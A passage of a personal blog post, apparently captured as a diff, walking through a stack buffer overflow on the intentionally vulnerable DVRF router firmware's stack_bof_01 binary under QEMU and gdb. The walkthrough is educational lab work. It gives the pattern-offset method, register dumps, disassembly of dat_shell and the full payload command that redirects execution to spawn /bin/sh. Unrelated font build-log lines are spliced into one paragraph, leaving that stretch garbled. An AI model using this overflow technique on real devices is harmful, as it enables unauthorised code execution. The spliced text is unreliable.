+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span></span><br><span class="line">[sudo] password for s34s0n: </span><br><span class="line">Welcome to the first BoF exercise!</span><br><span class="line"></span><br><span class="line">You entered Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9 </span><br><span class="line">Try Again</span><br></pre></td></tr></table></figure>
+
+<p>Examining the registers, we see that the PC (Program Counter) has been overwritten with the 0x41386741 direction:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info registers </span><br><span class="line">          zero       at       v0       v1       a0       a1       a2       a3</span><br><span class="line"> R0   00000000 fffffff8 00000041 7f7629b8 0000000a 7f7629c3 0000000b 00000000 </span><br><span class="line">            t0       t1       t2       t3       t4       t5       t6       t7</span><br><span class="line"> R8   81010100 7efefeff 41386941 6a413969 316a4130 41326a41 6a41336a 356a4134 </span><br><span class="line">            s0       s1       s2       s3       s4       s5       s6       s7</span><br><span class="line"> R16  00000000 00000000 00000000 ffffffff 7ffff4c4 0040059c 00000002 004007e0 </span><br><span class="line">            t8       t9       k0       k1       gp       sp       s8       ra</span><br><span class="line"> R24  7f6e65e0 7f6ef270 00000000 00000000 00448cd0 7ffff3e8 37674136 41386741 </span><br><span class="line">            sr       lo       hi      bad    cause       pc</span><br><span class="line">      20000010 0000000a 00000000 41386740 00000000 41386741 </span><br><span class="line">           fsr      fir</span><br><span class="line">      00000000 00739300 </span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
+
+<p>Converting the hexadecimal number 0x41386741 into ASCII we get A8gA.After reversing A8gA to Ag8A, locating it into the pattern, there is an offset of 204:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./pattern.pl 300 Ag8A</span></span><br><span class="line"></span><br><span class="line">Generate/Search Pattern </span><br><span class="line">Scripted by Wasim Halani (washal)</span><br><span class="line">https://securitythoughts.wordpress.com/</span><br><span class="line">Version 0.2</span><br><span class="line"></span><br><span class="line">String is : </span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span><br><span class="line"></span><br><span class="line">Pattern 'Ag8A' found at offset(s) : 204</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-Launching-the-exploitation"><a href="#5-Launching-the-exploitation" class="headerlink" title="5. Launching the exploitation"></a>5. Launching the exploitation</h4><p>The key concept to perform the attack is that the buffer must be rewriten with the first 204 characters (all characters before Ag8A) followed by the address of the function <strong>dat_shell()</strong><br><br><br>Now, creating a new pattern of just 204 characters and copying them:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./pattern.pl 204     </span></span><br><span class="line"></span><br><span class="line">Generate/Search Pattern </span><br><span class="line">Scripted by Wasim Halani (washal)</span><br><span class="line">https://securitythoughts.wordpress.com/</span><br><span class="line">Version 0.2</span><br><span class="line"></span><br><span class="line">String is : </span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7</span><br></pre></td></tr></table></figure>
+
+<p>This line grows the stack by an unsigned immediate (8) from the current stack pointer memory location (sp) and stores the new memory address in the stack pointer register. In this case, the stack pointer is going to decrease by 8 toward zero.<br>Instead of choosing the beginning address of <strong>dat_shell()</strong>, let’s pick four more advance instructions (0x0040095c). Otherwise the exploit does not work. We needto give the address after function prologue.</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas dat_shell </span><br><span class="line">Dump of assembler code for function dat_shell:</span><br><span class="line">   0x00400950 &lt;+0&gt;:	lui	gp,0x5</span><br><span class="line">   0x00400954 &lt;+4&gt;:	addiu	gp,gp,-31872</span><br><span class="line">   0x00400958 &lt;+8&gt;:	addu	gp,gp,t9</span><br><span class="line">   0x0040095c &lt;+12&gt;:	addiu	sp,sp,-32</span><br><span class="line">   0x00400960 &lt;+16&gt;:	sw	ra,28(sp)</span><br><span class="line">   0x00400964 &lt;+20&gt;:	sw	s8,24(sp)</span><br><span class="line">   0x00400968 &lt;+24&gt;:	move	s8,sp</span><br></pre></td></tr></table></figure>
+
+<p>Crafting a new parameter, composed of the 204 set of characters of the pattern, plus echoing 0x0040095c in a <strong>Little Indian</strong> format with option <strong>-e</strong>, to enable the interpretation of backslash escapes.<br><br>LGM-Bold.ttf<br>INFO  Generated: lib/meslo-LG/MesloLGS-Regular.ttf<br>INFO  Generated: lib/meslo-LG/MesloLGL-Regular.ttf<br>INFO  Generated: lib/meslo-LG/MesloLGS-Bold.ttf<br>INFO  Generated: lib/font-awesome/webfonts/fa-brands-400.svg<br>INFO  Generated: lib/font-awesom<br>Let’s pass the argument to the program:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 <span class="string">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7`echo -e '\\x5c\\x09\\x40'`"</span></span></span><br></pre></td></tr></table></figure>
+
+<p>Remote debugging again and remote debugging again:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) target remote 127.0.0.1:1234</span><br><span class="line">Remote debugging using 127.0.0.1:1234</span><br><span class="line">Reading symbols from /home/s34s0n/bi0s/Hardware/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/lib/ld-uClibc.so.0...(no debugging symbols found)...done.</span><br><span class="line"></span><br><span class="line">Program received signal SIGTRAP, Trace/breakpoint trap.</span><br><span class="line">0x7f7b9a80 in _start ()</span><br><span class="line">   from /home/s34s0n/bi0s/Hardware/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/lib/ld-uClibc.so.0</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">[Inferior 1 (Remote target) exited normally]</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
+
+<p>At this point the registers PC has been loaded with the function <strong>dat_shell()</strong>.
+<br><br>Eventually the buffer overflow attack is successful because dat_shell() function is executed</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 <span class="string">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7`echo -e '\\x5c\\x09\\x40'`"</span></span></span><br><span class="line">Welcome to the first BoF exercise!</span><br><span class="line"></span><br><span class="line">You entered Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7\	@ </span><br><span class="line">Try Again</span><br><span class="line">Congrats! I will now execute /bin/sh</span><br><span class="line">- b1ack0wl</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/s34s0n">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Getting-Started-with-Damn-Vulnerable-Router-Firmware-DVRF-v0-1"><span class="toc-number">1.</span> <span class="toc-text">Getting Started with Damn Vulnerable Router Firmware (DVRF) v0.1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer-Overflow-exploitation-on-MIPS-architecture-emulated-with-QEMU-by-remote-debugging-with-GDB"><span class="toc-number">1.1.</span> <span class="toc-text">Buffer Overflow exploitation on MIPS architecture emulated with QEMU by remote debugging with GDB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.1.</span> <span class="toc-text">Introduction</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Analyse-the-binary"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">1. Analyse the binary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Emulate-the-binary-in-Qemu-virtual-environment"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">2. Emulate the binary in Qemu virtual environment</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Remote-debugging-with-gdb-multiarch"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">3. Remote debugging with gdb-multiarch</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-Preparing-the-attack"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">4. Preparing the attack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-Launching-the-exploitation"><span class="toc-number">1.1.1.5.</span> <span class="toc-text">5. Launching the exploitation</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://s34s0n.github.io/2019/06/21/Learning-with-DVRF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://s34s0n.github.io/2019/06/21/Learning-with-DVRF/&text=Learning with DVRF"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://s34s0n.github.io/2019/06/21/Learning-with-DVRF/&title=Learning with DVRF"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://s34s0n.github.io/2019/06/21/Learning-with-DVRF/&is_video=false&description=Learning with DVRF"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Learning with DVRF&body=Check out this article: https://s34s0n.github.io/2019/06/21/Learning-with-DVRF/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://s34s0n.github.io/2019/06/21/Learning-with-DVRF/&title=Learning with DVRF"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://s34s0n.github.io/2019/06/21/Learning-with-DVRF/&title=Learning with DVRF"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://s34s0n.github.io/2019/06/21/Learning-with-DVRF/&title=Learning with DVRF"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://s34s0n.github.io/2019/06/21/Learning-with-DVRF/&title=Learning with DVRF"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://s34s0n.github.io/2019/06/21/Learning-with-DVRF/&name=Learning with DVRF&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Season Cherian
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/s34s0n">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-142416047-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 's34s0n-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
